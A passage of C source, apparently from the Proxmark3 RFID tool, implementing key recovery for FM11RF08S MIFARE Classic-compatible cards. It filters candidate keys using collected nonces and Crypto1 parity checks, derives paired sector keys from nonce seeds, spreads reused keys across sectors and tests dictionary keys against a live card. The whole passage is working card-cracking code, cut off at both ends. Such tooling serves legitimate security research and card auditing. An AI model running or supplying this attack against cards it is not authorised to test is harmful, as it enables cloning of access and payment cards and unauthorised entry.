    uint32_t accepted = fm11_accept_found_key(nonces, candidates, keys_found, found_key, sec, key_type, key);

    const fm11_reuse_bucket_t *bucket = fm11_reuse_index_find(reuse_index, key);
    if (bucket == NULL) {
        return accepted;
    }

    key &= 0xFFFFFFFFFFFFULL;
    for (uint32_t i = 0; i < bucket->count; i++) {
        const fm11_candidate_ref_t *ref = &reuse_index->refs[bucket->start + i];
        if (found_key[ref->sec][ref->key_type]) {
            continue;
        }
        if (fm11_keylist_promote_existing_hint(&candidates[ref->sec][ref->key_type], key, ref->idx) == false) {
            continue;
        }
        if (probe_queue != NULL) {
            fm11_probe_queue_push(probe_queue, ref->sec, ref->key_type, key);
        }
    }
    return accepted;
}

static uint32_t fm11_propagate_found_keys(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                          fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                          uint64_t keys_found[FM11RF08S_SECTORS][2],
                                          bool found_key[FM11RF08S_SECTORS][2]) {
    uint32_t accepted = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt]) {
                accepted += fm11_accept_found_key(nonces, candidates, keys_found, found_key, sec, kt, keys_found[sec][kt]);
            }
        }
    }
    return accepted;
}

static uint32_t fm11_try_derive_all(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                    fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                    uint64_t keys_found[FM11RF08S_SECTORS][2],
                                    bool found_key[FM11RF08S_SECTORS][2],
                                    uint32_t *reduced_candidates,
                                    bool promote_inferred) {
    uint32_t derived = 0;
    if (reduced_candidates != NULL) {
        *reduced_candidates = 0;
    }
    if (nonces == NULL) {
        return 0;
    }

    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        uint32_t nt_a = fm11_bytes_to_u32(nonces->nt[sec][0]);
        uint32_t nt_b = fm11_bytes_to_u32(nonces->nt[sec][1]);

        if (nt_a == nt_b) {
            continue;
        }

        if (found_key[sec][0] && found_key[sec][1] == false) {
            uint64_t key = 0;
            uint16_t seed = fm11_compute_seednt16_nt32(nt_a, keys_found[sec][0]);
            uint32_t old_count = 0;
            uint32_t new_count = 0;
            if (fm11_filter_candidates_by_seed(&candidates[sec][1], nt_b, seed, &old_count, &new_count) == PM3_SUCCESS &&
                    reduced_candidates != NULL && old_count > new_count) {
                *reduced_candidates += old_count - new_count;
            }
            if (promote_inferred &&
                    fm11_derive_pair_key(nt_a, keys_found[sec][0], nt_b, &candidates[sec][1], &key)) {
                derived += fm11_accept_found_key(nonces, candidates, keys_found, found_key, sec, 1, key);
            }
        }
        if (found_key[sec][1] && found_key[sec][0] == false) {
            uint64_t key = 0;
            uint16_t seed = fm11_compute_seednt16_nt32(nt_b, keys_found[sec][1]);
            uint32_t old_count = 0;
            uint32_t new_count = 0;
            if (fm11_filter_candidates_by_seed(&candidates[sec][0], nt_a, seed, &old_count, &new_count) == PM3_SUCCESS &&
                    reduced_candidates != NULL && old_count > new_count) {
                *reduced_candidates += old_count - new_count;
            }
            if (promote_inferred &&
                    fm11_derive_pair_key(nt_b, keys_found[sec][1], nt_a, &candidates[sec][0], &key)) {
                derived += fm11_accept_found_key(nonces, candidates, keys_found, found_key, sec, 0, key);
            }
        }
    }
    return derived;
}

static uint32_t fm11_promote_singletons(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                        fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                        uint64_t keys_found[FM11RF08S_SECTORS][2],
                                        bool found_key[FM11RF08S_SECTORS][2],
                                        bool promote_inferred) {
    uint32_t promoted = 0;
    if (promote_inferred == false) {
        return 0;
    }
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt] == false && candidates[sec][kt].count == 1) {
                keys_found[sec][kt] = candidates[sec][kt].data[0].key;
                found_key[sec][kt] = true;
                promoted++;
            }
        }
    }
    return promoted;
}

static uint32_t fm11_propagate_exact_reused_keys(fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                                 uint64_t keys_found[FM11RF08S_SECTORS][2],
                                                 bool found_key[FM11RF08S_SECTORS][2],
                                                 bool promote_inferred) {
    uint32_t propagated = 0;
    if (promote_inferred == false) {
        return 0;
    }
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt] == false) {
                continue;
            }
            uint64_t k = keys_found[sec][kt];
            for (uint8_t s2 = 0; s2 < FM11RF08S_SECTORS; s2++) {
                for (uint8_t kt2 = 0; kt2 < 2; kt2++) {
                    if (found_key[s2][kt2]) {
                        continue;
                    }
                    if (candidates[s2][kt2].count == 1 &&
                            candidates[s2][kt2].data[0].key == k) {
                        keys_found[s2][kt2] = k;
                        found_key[s2][kt2] = true;
                        propagated++;
                    }
                }
            }
        }
    }
    return propagated;
}


static uint32_t fm11_offline_fixpoint(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                      fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                      uint64_t keys_found[FM11RF08S_SECTORS][2],
                                      bool found_key[FM11RF08S_SECTORS][2],
                                      uint32_t *reduced_out,
                                      bool promote_inferred) {
    uint32_t total_changed = 0;
    uint32_t total_reduced = 0;

    for (;;) {
        uint32_t changed = 0;

        changed += fm11_promote_singletons(nonces, candidates, keys_found, found_key, promote_inferred);
        changed += fm11_propagate_exact_reused_keys(candidates, keys_found, found_key, promote_inferred);
        uint32_t r = 0;
        changed += fm11_try_derive_all(nonces, candidates, keys_found, found_key, &r, promote_inferred);
        total_reduced += r;
        if (promote_inferred) {
            changed += fm11_propagate_found_keys(nonces, candidates, keys_found, found_key);
        }

        total_changed += changed;
        if (changed == 0) {
            break;
        }
    }

    if (reduced_out != NULL) {
        *reduced_out = total_reduced;
    }
    return total_changed;
}

static uint32_t fm11_apply_reader_material(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                           fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                           uint64_t keys_found[FM11RF08S_SECTORS][2],
                                           bool found_key[FM11RF08S_SECTORS][2],
                                           uint64_t reader_keys[FM11RF08S_NORMAL_SECTORS][2],
                                           bool reader_found[FM11RF08S_NORMAL_SECTORS][2]) {
    uint32_t accepted = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (reader_found[sec][kt] == false) {
                continue;
            }
            if (fm11_keylist_has_key(&candidates[sec][kt], reader_keys[sec][kt]) == false) {
                PrintAndLogEx(WARNING, "Reader key sec %03u key %c is outside FM11RF08S candidate set, promoting reader material",
                              sec, kt ? 'B' : 'A');
                int res = fm11_keylist_promote_or_prepend(&candidates[sec][kt], reader_keys[sec][kt]);
                if (res != PM3_SUCCESS) {
                    continue;
                }
            }
            accepted += fm11_accept_found_key(nonces, candidates, keys_found, found_key, sec, kt, reader_keys[sec][kt]);
        }
    }
    return accepted;
}

static int fm11_build_global_priority_keys(fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                           uint32_t duplicate_prefix[FM11RF08S_SECTORS][2],
                                           fm11_keylist_t *priority) {
    if (priority == NULL) {
        return PM3_EINVARG;
    }

    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            uint32_t limit = MIN(duplicate_prefix[sec][kt], candidates[sec][kt].count);
            for (uint32_t i = 0; i < limit; i++) {
                if (((priority->count & 0x3FF) == 0) && kbd_enter_pressed()) {
                    return PM3_EOPABORTED;
                }
                int res = fm11_keylist_add_unique(priority, candidates[sec][kt].data[i].key);
                if (res != PM3_SUCCESS) {
                    return res;
                }
            }
        }
    }
    return PM3_SUCCESS;
}

static int fm11_build_reuse_priority_keys(const fm11_reuse_index_t *reuse_index,
                                          fm11_keylist_t *priority,
                                          uint32_t max_keys,
                                          uint32_t *eligible_out) {
    if (reuse_index == NULL || priority == NULL) {
        return PM3_EINVARG;
    }
    if (eligible_out != NULL) {
        *eligible_out = 0;
    }
    if (reuse_index->bucket_count == 0 || max_keys == 0) {
        return PM3_SUCCESS;
    }

    fm11_reuse_priority_t *ranked = calloc(reuse_index->bucket_count, sizeof(fm11_reuse_priority_t));
    if (ranked == NULL) {
        return PM3_EMALLOC;
    }

    uint32_t count = 0;
    for (uint32_t bi = 0; bi < reuse_index->bucket_count; bi++) {
        if (((bi & 0x3FF) == 0) && kbd_enter_pressed()) {
            free(ranked);
            return PM3_EOPABORTED;
        }
        const fm11_reuse_bucket_t *bucket = &reuse_index->buckets[bi];
        if (bucket->count < 2) {
            continue;
        }
        uint32_t ordinal = UINT32_MAX;
        uint32_t sector_mask = 0;
        for (uint32_t i = 0; i < bucket->count; i++) {
            const fm11_candidate_ref_t *ref = &reuse_index->refs[bucket->start + i];
            ordinal = MIN(ordinal, ref->idx);
            sector_mask |= 1U << ref->sec;
        }
        uint32_t sectors = __builtin_popcount(sector_mask);
        if (sectors < 2) {
            continue;
        }
        ranked[count++] = (fm11_reuse_priority_t) {
            .key = bucket->key,
            .sectors = sectors,
            .refs = bucket->count,
            .ordinal = ordinal,
        };
    }
    if (eligible_out != NULL) {
        *eligible_out = count;
    }
    if (count == 0) {
        free(ranked);
        return PM3_SUCCESS;
    }

    qsort(ranked, count, sizeof(fm11_reuse_priority_t), fm11_cmp_reuse_priority);

    uint32_t limit = MIN(count, max_keys);
    int retval = PM3_SUCCESS;
    for (uint32_t i = 0; i < limit; i++) {
        if (((i & 0x3FF) == 0) && kbd_enter_pressed()) {
            retval = PM3_EOPABORTED;
            break;
        }
        retval = fm11_keylist_add_unique(priority, ranked[i].key);
        if (retval != PM3_SUCCESS) {
            break;
        }
    }
    free(ranked);
    return retval;
}

static int fm11_verify_global_priority_keys(const fm11_keylist_t *priority,
                                            uint64_t keys_found[FM11RF08S_SECTORS][2],
                                            bool found_key[FM11RF08S_SECTORS][2]) {
    if (priority == NULL || priority->count == 0) {
        return PM3_SUCCESS;
    }

    sector_t *e_sector = calloc(FM11RF08S_NORMAL_SECTORS, sizeof(sector_t));
    if (e_sector == NULL) {
        return PM3_EMALLOC;
    }
    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt]) {
                e_sector[sec].Key[kt] = keys_found[sec][kt];
                e_sector[sec].foundKey[kt] = true;
            }
        }
    }

    int retval = PM3_SUCCESS;
    bool progress_shown = false;
    for (uint8_t strategy = 1; strategy < 3; strategy++) {
        bool first_chunk = true;
        for (uint32_t idx = 0; idx < priority->count; idx += KEYS_IN_BLOCK) {
            if (kbd_enter_pressed()) {
                retval = PM3_EOPABORTED;
                goto out;
            }

            uint8_t key_block[KEYBLOCK_SIZE] = {0};
            uint8_t chunk = MIN(KEYS_IN_BLOCK, priority->count - idx);
            bool last_chunk = (idx + chunk) >= priority->count;
            for (uint8_t i = 0; i < chunk; i++) {
                num_to_bytes(priority->data[idx + i].key, MIFARE_KEY_SIZE, key_block + (i * MIFARE_KEY_SIZE));
            }

            int res = mf_check_keys_fast_ex(FM11RF08S_NORMAL_SECTORS, first_chunk, last_chunk, strategy, chunk, key_block, e_sector, false, false, true, 0);
            if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
                retval = res;
                goto out;
            }
            if (first_chunk) {
                first_chunk = false;
            }
            fm11_sen_compute_progress("Batch fchk", MIN(idx + chunk, priority->count), priority->count, priority->count);
            progress_shown = true;
            if (res == PM3_SUCCESS) {
                goto out;
            }
        }
    }

out:
    if (progress_shown) {
        fm11_sen_clear_inplace();
    }
    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (e_sector[sec].foundKey[kt]) {
                keys_found[sec][kt] = e_sector[sec].Key[kt];
                found_key[sec][kt] = true;
            }
        }
    }
    free(e_sector);
    return retval;
}

static void fm11_print_key_hit_row(uint32_t nonce_count, uint8_t sec, uint8_t kt, uint64_t key,
                                   const bool found_key[FM11RF08S_SECTORS][2]) {
    fm11_sen_finish_inplace();
    uint32_t keys_so_far = fm11_count_found_keys(found_key);
    uint64_t elapsed_key = fm11_sen_start_time ? (msclock() - fm11_sen_start_time) : 0;
    char kcount[16] = {0};
    snprintf(kcount, sizeof(kcount), "%u/%u keys", keys_so_far, FM11RF08S_SECTORS * 2);
    PrintAndLogEx(SUCCESS,
                  " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " |"
                  " Key sec " _YELLOW_("%03u") " key " _YELLOW_("%c") " = " _GREEN_("%012" PRIX64) "                        |"
                  " " _YELLOW_("%25s") " | %13s ",
                  (float)elapsed_key / 1000.0, nonce_count,
                  fm11_real_sector(sec), kt ? 'B' : 'A', key & 0xFFFFFFFFFFFFULL,
                  kcount, "");
}

static bool fm11_key_matches_nonce(uint32_t uid,
                                   const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                   uint8_t sec,
                                   uint8_t kt,
                                   uint64_t key,
                                   uint8_t parity_mask) {
    uint32_t nt = fm11_bytes_to_u32(nonces->nt[sec][kt]);
    uint32_t nt_enc = fm11_bytes_to_u32(nonces->nt_enc[sec][kt]);
    uint8_t par_err = nonces->par_err[sec][kt];
    uint8_t nt_par_enc = ((((par_err >> 3) & 1) ^ oddparity8((nt_enc >> 24) & 0xFF)) << 3) |
                         ((((par_err >> 2) & 1) ^ oddparity8((nt_enc >> 16) & 0xFF)) << 2) |
                         ((((par_err >> 1) & 1) ^ oddparity8((nt_enc >>  8) & 0xFF)) << 1) |
                         ((((par_err >> 0) & 1) ^ oddparity8((nt_enc >>  0) & 0xFF)) << 0);

    struct Crypto1State *s = crypto1_create(key & 0xFFFFFFFFFFFFULL);
    if (s == NULL) {
        return false;
    }
    uint32_t ks1 = crypto1_word(s, nt ^ uid, 0);
    uint32_t ks2 = crypto1_word(s, 0, 0);
    if ((nt ^ ks1) != nt_enc) {
        crypto1_destroy(s);
        return false;
    }

    for (uint8_t byte_i = 0; byte_i < 4; byte_i++) {
        if (parity_mask & (1U << byte_i)) {
            uint8_t ks_par = (ks2 >> (24 + byte_i)) & 1;
            uint8_t observed_dec = ((nt_par_enc >> byte_i) & 1) ^ ks_par;
            uint8_t nt_byte = (nt >> (byte_i * 8)) & 0xFF;
            if (observed_dec != oddparity8(nt_byte)) {
                crypto1_destroy(s);
                return false;
            }
        }
    }

    crypto1_destroy(s);
    return true;
}

static int fm11_collect_default_nonce_matches(uint32_t uid,
                                              const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                              const fm11_keylist_t *defaults,
                                              const bool found_key[FM11RF08S_SECTORS][2],
                                              uint8_t parity_mask,
                                              fm11_keylist_t *matches) {
    if (nonces == NULL || defaults == NULL || matches == NULL) {
        return PM3_EINVARG;
    }
    if (defaults->count == 0) {
        return PM3_SUCCESS;
    }

    uint32_t slots = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key != NULL && found_key[sec][kt]) {
                continue;
            }
            slots++;
        }
    }

    uint32_t total = defaults->count * slots;
    uint32_t done = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        uint8_t real_sec = fm11_real_sector(sec);
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key != NULL && found_key[sec][kt]) {
                continue;
            }
            for (uint32_t i = 0; i < defaults->count; i++) {
                if ((done & 0x3F) == 0) {
                    if (kbd_enter_pressed()) {
                        fm11_sen_clear_inplace();
                        return PM3_EOPABORTED;
                    }
                    fm11_sen_keycheck_progress("def", real_sec, kt, done, total, defaults->count);
                }
                if (fm11_key_matches_nonce(uid, nonces, sec, kt, defaults->data[i].key, parity_mask)) {
                    int res = fm11_keylist_add_unique(matches, defaults->data[i].key);
                    if (res != PM3_SUCCESS) {
                        fm11_sen_clear_inplace();
                        return res;
                    }
                }
                done++;
            }
            fm11_sen_keycheck_progress("def", real_sec, kt, done, total, defaults->count);
        }
    }
    fm11_sen_finish_inplace();
    return PM3_SUCCESS;
}

static int fm11_check_default_keys(uint32_t uid,
                                   uint32_t nonce_count,
                                   const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                   const fm11_keylist_t *defaults,
                                   uint8_t parity_mask,
                                   uint64_t keys_found[FM11RF08S_SECTORS][2],
                                   bool found_key[FM11RF08S_SECTORS][2]) {
    fm11_keylist_t matches = {0};
    int retval = fm11_collect_default_nonce_matches(uid, nonces, defaults, found_key, parity_mask, &matches);
    if (retval != PM3_SUCCESS) {
        fm11_keylist_free(&matches);
        return retval;
    }
    char activity[80];
    snprintf(activity, sizeof(activity), "Nonce evidence matched %u default/dictionary keys", matches.count);
    fm11_sen_progress(nonce_count, activity, matches.count, 0);
    if (matches.count == 0) {
        fm11_keylist_free(&matches);
        return PM3_SUCCESS;
    }

    sector_t *e_sector = calloc(FM11RF08S_NORMAL_SECTORS, sizeof(sector_t));
    if (e_sector == NULL) {
        fm11_keylist_free(&matches);
        return PM3_EMALLOC;
    }

    bool was_found[FM11RF08S_SECTORS][2] = {{false}};
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            was_found[sec][kt] = found_key[sec][kt];
        }
    }

    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt]) {
                e_sector[sec].Key[kt] = keys_found[sec][kt];
                e_sector[sec].foundKey[kt] = true;
            }
        }
    }

    uint32_t pass_total = matches.count * FM11RF08S_NORMAL_SECTORS * 2;
    bool progress_shown = false;
    for (uint8_t strategy = 1; strategy < 3; strategy++) {
        bool first_chunk = true;
        for (uint32_t idx = 0; idx < matches.count; idx += KEYS_IN_BLOCK) {
            if (kbd_enter_pressed()) {
                retval = PM3_EOPABORTED;
                goto normal_out;
            }

            uint8_t key_block[KEYBLOCK_SIZE] = {0};
            uint8_t chunk = MIN(KEYS_IN_BLOCK, matches.count - idx);
            bool last_chunk = (idx + chunk) >= matches.count;
            for (uint8_t i = 0; i < chunk; i++) {
                num_to_bytes(matches.data[idx + i].key, MIFARE_KEY_SIZE, key_block + (i * MIFARE_KEY_SIZE));
            }

            uint32_t shown_before = ((strategy - 1) * pass_total) + (idx * FM11RF08S_NORMAL_SECTORS * 2);
            fm11_sen_keycheck_progress("def", FM11RF08S_NORMAL_SECTORS - 1, MF_KEY_B,
                                       shown_before, pass_total * 2, matches.count);
            progress_shown = true;

            int res = mf_check_keys_fast_ex(FM11RF08S_NORMAL_SECTORS, first_chunk, last_chunk, strategy,
                                            chunk, key_block, e_sector, false, false, true, 0);
            if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
                retval = res;
                goto normal_out;
            }

            uint32_t pass_done = MIN(idx + chunk, matches.count) * FM11RF08S_NORMAL_SECTORS * 2;
            uint32_t shown_done = ((strategy - 1) * pass_total) + pass_done;
            fm11_sen_keycheck_progress("def", FM11RF08S_NORMAL_SECTORS - 1, MF_KEY_B,
                                       shown_done, pass_total * 2, matches.count);
            first_chunk = false;
        }
    }

normal_out:
    if (progress_shown) {
        fm11_sen_clear_inplace();
    }

    uint32_t sec32_total = matches.count * 2;
    uint32_t sec32_done = 0;
    uint8_t sec32 = FM11RF08S_SECTORS - 1;
    uint8_t real_sec32 = fm11_real_sector(sec32);
    for (uint8_t kt = 0; kt < 2 && retval == PM3_SUCCESS; kt++) {
        if (found_key[sec32][kt]) {
            sec32_done += matches.count;
            continue;
        }
        for (uint32_t idx = 0; idx < matches.count; idx += KEYS_IN_BLOCK) {
            if (kbd_enter_pressed()) {
                retval = PM3_EOPABORTED;
                break;
            }
            uint8_t key_block[KEYBLOCK_SIZE] = {0};
            uint8_t chunk = MIN(KEYS_IN_BLOCK, matches.count - idx);
            for (uint8_t i = 0; i < chunk; i++) {
                num_to_bytes(matches.data[idx + i].key, MIFARE_KEY_SIZE, key_block + (i * MIFARE_KEY_SIZE));
            }
            uint64_t out_key = 0;
            int res = mf_check_keys(mfFirstBlockOfSector(real_sec32), kt, false, chunk, key_block, &out_key);
            sec32_done += chunk;
            fm11_sen_keycheck_progress("def", real_sec32, kt, sec32_done, sec32_total, matches.count);
            progress_shown = true;
            if (res == PM3_SUCCESS) {
                keys_found[sec32][kt] = out_key & 0xFFFFFFFFFFFFULL;
                found_key[sec32][kt] = true;
                break;
            }
            if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
                retval = res;
                break;
            }
        }
    }
    if (progress_shown) {
        fm11_sen_clear_inplace();
    }

    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (e_sector[sec].foundKey[kt]) {
                keys_found[sec][kt] = e_sector[sec].Key[kt] & 0xFFFFFFFFFFFFULL;
                found_key[sec][kt] = true;
                if (was_found[sec][kt] == false) {
                    fm11_print_key_hit_row(nonce_count, sec, kt, keys_found[sec][kt], found_key);
                }
            }
        }
    }
    for (uint8_t kt = 0; kt < 2; kt++) {
        if (found_key[sec32][kt] && was_found[sec32][kt] == false) {
            fm11_print_key_hit_row(nonce_count, sec32, kt, keys_found[sec32][kt], found_key);
        }
    }
    free(e_sector);
    fm11_keylist_free(&matches);
    return retval;
}

static uint32_t fm11_propagate_key_reuse_online(uint32_t nonce_count, uint64_t key,
                                                uint64_t keys_found[FM11RF08S_SECTORS][2],
                                                bool found_key[FM11RF08S_SECTORS][2]) {
    sector_t *e_sector = calloc(FM11RF08S_NORMAL_SECTORS, sizeof(sector_t));
    if (e_sector == NULL) {
        return 0;
    }

    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt]) {
                e_sector[sec].Key[kt] = keys_found[sec][kt];
                e_sector[sec].foundKey[kt] = true;
            }
        }
    }

    key &= 0xFFFFFFFFFFFFULL;
    uint8_t key_block[KEYBLOCK_SIZE] = {0};
    num_to_bytes(key, MIFARE_KEY_SIZE, key_block);
    uint32_t newly_found = 0;

    uint32_t pass_total = FM11RF08S_NORMAL_SECTORS * 2;
    bool progress_shown = false;
    for (uint8_t strategy = 1; strategy < 3; strategy++) {
        if (kbd_enter_pressed()) {
            break;
        }
        int res = mf_check_keys_fast_ex(FM11RF08S_NORMAL_SECTORS, true, true, strategy, 1,
                                        key_block, e_sector, false, false, true, 0);
        if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
            break;
        }
        fm11_sen_keycheck_progress("use", FM11RF08S_NORMAL_SECTORS - 1, MF_KEY_B,
                                   strategy * pass_total, pass_total * 2, pass_total);
        progress_shown = true;
        if (res == PM3_SUCCESS) {
            break;
        }
    }

    uint8_t sec32 = FM11RF08S_SECTORS - 1;
    uint8_t real_sec32 = fm11_real_sector(sec32);
    for (uint8_t kt = 0; kt < 2; kt++) {
        if (kbd_enter_pressed()) {
            break;
        }
        if (found_key[sec32][kt]) {
            continue;
        }
        uint64_t out_key = 0;
        int res = mf_check_keys(mfFirstBlockOfSector(real_sec32), kt, false, 1, key_block, &out_key);
        fm11_sen_keycheck_progress("use", real_sec32, kt, (pass_total * 2) + kt + 1, (pass_total * 2) + 2, pass_total + 2);
        progress_shown = true;
        if (res == PM3_SUCCESS && ((out_key & 0xFFFFFFFFFFFFULL) == key)) {
            keys_found[sec32][kt] = key;
            found_key[sec32][kt] = true;
            newly_found++;
            fm11_print_key_hit_row(nonce_count, sec32, kt, key, found_key);
        }
    }
    if (progress_shown) {
        fm11_sen_clear_inplace();
    }

    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (e_sector[sec].foundKey[kt] && found_key[sec][kt] == false) {
                keys_found[sec][kt] = key;
                found_key[sec][kt] = true;
                newly_found++;
                fm11_print_key_hit_row(nonce_count, sec, kt, key, found_key);
            }
        }
    }

    free(e_sector);
    return newly_found;
}

static uint32_t fm11_estimate_candidate_path_cost(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                                  fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                                  uint64_t keys_found[FM11RF08S_SECTORS][2],
                                                  const bool found_key[FM11RF08S_SECTORS][2],
                                                  uint8_t sec,
                                                  uint8_t kt) {
    /*
     * This is not raw list length.  It estimates how many candidates we must
     * test before this path can collapse the paired key list through a unique
     * FM11RF08S seed match.  A larger list can therefore be cheaper when one
     * of its early candidates maps to exactly one paired candidate.
     */
    if (nonces == NULL || found_key[sec][kt] || candidates[sec][kt].count == 0) {
        return UINT32_MAX;
    }

    fm11_keylist_t *list = &candidates[sec][kt];
    fm11_keylist_t *paired = &candidates[sec][kt ^ 1];

    if (found_key[sec][kt ^ 1]) {
        uint32_t nt = fm11_bytes_to_u32(nonces->nt[sec][kt]);
        uint32_t paired_nt = fm11_bytes_to_u32(nonces->nt[sec][kt ^ 1]);
        uint64_t paired_key = keys_found[sec][kt ^ 1] & 0xFFFFFFFFFFFFULL;
        if (nt != paired_nt) {
            uint16_t seed = fm11_compute_seednt16_nt32(paired_nt, paired_key);
            fm11_compute_list_seeds(list, nt);
            for (uint32_t i = 0; i < list->count; i++) {
                if (list->data[i].seed == seed) {
                    return i + 1;
                }
            }
            return list->count;
        }
        for (uint32_t i = 0; i < list->count; i++) {
            if (list->data[i].key == paired_key) {
                return i + 1;
            }
        }
        return list->count;
    }

    uint32_t nt = fm11_bytes_to_u32(nonces->nt[sec][kt]);
    uint32_t paired_nt = fm11_bytes_to_u32(nonces->nt[sec][kt ^ 1]);
    if (paired->count == 0 || nt == paired_nt) {
        return list->count;
    }

    fm11_compute_list_seeds(list, nt);
    fm11_compute_list_seeds(paired, paired_nt);
    uint16_t *paired_seed_count = calloc(UINT16_MAX + 1, sizeof(uint16_t));
    if (paired_seed_count == NULL) {
        return list->count;
    }
    for (uint32_t i = 0; i < paired->count; i++) {
        uint16_t s = paired->data[i].seed;
        if (paired_seed_count[s] < UINT16_MAX) {
            paired_seed_count[s]++;
        }
    }
    uint32_t cost = list->count;
    for (uint32_t i = 0; i < list->count; i++) {
        if (paired_seed_count[list->data[i].seed] == 1) {
            cost = i + 1;
            break;
        }
    }
    free(paired_seed_count);
    return cost;
}

static void fm11_measure_candidate_paths(const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                         fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                         uint64_t keys_found[FM11RF08S_SECTORS][2],
                                         const bool found_key[FM11RF08S_SECTORS][2],
                                         uint32_t nonce_count) {
    uint8_t best_sec = 0xFF;
    uint8_t best_kt = 0;
    uint32_t best_cost = UINT32_MAX;
    uint32_t best_count = UINT32_MAX;
    uint32_t total = 0;
    uint32_t done = 0;

    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt] == false) {
                total++;
            }
        }
    }

    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (((done & 0x3) == 0) && kbd_enter_pressed()) {
                fm11_sen_clear_inplace();
                return;
            }
            if (found_key[sec][kt]) {
                continue;
            }
            uint32_t count = candidates[sec][kt].count;
            uint32_t cost = fm11_estimate_candidate_path_cost(nonces, candidates, keys_found, found_key, sec, kt);
            fm11_sen_compute_progress("Measurement", ++done, total, count);
            if (cost < best_cost || (cost == best_cost && count < best_count)) {
                best_cost = cost;
                best_count = count;
                best_sec = sec;
                best_kt = kt;
            }
        }
    }
    if (total > 0) {
        fm11_sen_clear_inplace();
    }

    if (best_sec != 0xFF) {
        char activity[80];
        snprintf(activity, sizeof(activity), "Measurement: best sec %03u %c cost %u list %u",
                 fm11_real_sector(best_sec), best_kt ? 'B' : 'A', best_cost, best_count);
        fm11_sen_progress(nonce_count, activity, best_count, 0);
    }
}

static int fm11_verify_candidates(uint8_t real_sec, uint8_t key_type, const fm11_keylist_t *list, uint64_t *key_out) {
    if (list == NULL || key_out == NULL || list->count == 0) {
        return PM3_ESOFT;
    }

    uint8_t block_no = real_sec * 4;
    uint32_t idx = 0;
    uint8_t timeout_retries = 0;
    uint32_t last_progress = 0;
    fm11_sen_candidate_progress(real_sec, key_type, 0, list->count);
    while (idx < list->count) {
        uint8_t key_block[KEYBLOCK_SIZE] = {0};
        uint8_t chunk = MIN(KEYS_IN_BLOCK, list->count - idx);
        for (uint8_t i = 0; i < chunk; i++) {
            num_to_bytes(list->data[idx + i].key, MIFARE_KEY_SIZE, key_block + (i * MIFARE_KEY_SIZE));
        }
        uint64_t found = 0;
        bool found_valid = false;
        int res = PM3_ESOFT;
        if (real_sec < FM11RF08S_NORMAL_SECTORS) {
            sector_t e_sector[FM11RF08S_NORMAL_SECTORS] = {0};
            uint16_t single_sector_params = (block_no & 0xFF) | (key_type << 8) | (1 << 15);
            res = mf_check_keys_fast_ex(FM11RF08S_NORMAL_SECTORS, idx == 0, (idx + chunk) >= list->count,
                                        1, chunk, key_block, e_sector, false, false, true, single_sector_params);
            if (res == PM3_SUCCESS && e_sector[real_sec].foundKey[key_type]) {
                found = e_sector[real_sec].Key[key_type];
                found_valid = true;
            }
        } else {
            res = mf_check_keys(block_no, key_type, false, chunk, key_block, &found);
            found_valid = (res == PM3_SUCCESS);
        }
        if (res == PM3_SUCCESS && found_valid) {
